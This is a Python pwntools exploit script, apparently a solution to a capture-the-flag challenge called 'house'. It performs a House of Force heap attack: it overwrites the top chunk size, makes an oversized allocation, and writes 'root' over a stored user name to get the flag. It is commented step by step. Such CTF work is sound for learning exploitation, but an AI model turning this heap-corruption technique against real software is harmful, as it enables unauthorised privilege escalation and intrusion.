#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("house_patched")

# shortcuts
def sla(delim,line): return p.sendlineafter(delim,line)

host, port = "house.nc.jctf.pro", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

# this is an house of force heap attack, we first overwrite top_chunk size with 0xffffffffffffffff  (which is a pretty big number...)
sla('>> ', '1')
sla(': ', b'A'*0x18+p64(-1, signed=True))

# next we allocate a chunk with the new admin name that will be copied to the last chunk
sla(': ', b'root\x00')
# we send a big number as disk space to make the next allocation after this one to fall on the chunk with actual user name, the program will copy our admin name "root" to the actual user
sla('space: ', '18446744073709551464')
# now read flag with dump us the flag, as we are root
sla('>> ', '2')

p.interactive()

